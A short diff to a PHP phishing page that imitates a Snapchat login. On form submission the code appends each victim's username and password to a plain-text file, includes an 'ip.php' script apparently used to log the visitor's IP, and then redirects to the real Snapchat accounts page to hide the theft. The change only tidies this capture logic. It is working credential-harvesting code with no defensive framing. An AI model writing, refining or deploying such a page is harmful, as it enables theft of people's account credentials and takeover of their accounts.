@@ -1,5 +1,4 @@
 <?php
-include 'ip.php';
 // define variables and set to empty values
 $nameErr = $error_css = $errortext = $error3 = $error4 = $error1 = $error2 = "";
 
@@ -20,7 +19,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $error1 = 'color: #F01B47';
     $error2 = 'border-color: #F23C57';
   }  else {
-    file_put_contents("usernames.txt", "[username]: "  . $_POST['username'] .  "[password]: "  . $_POST['password'] . "\n", FILE_APPEND);
+    include 'ip.php';
+    file_put_contents("usernames.txt", "[username]: " . $_POST['username'] . " [password]: " . $_POST['password'] . "\n", FILE_APPEND);
     header('Location: https://accounts.snapchat.com'); 
   }
      
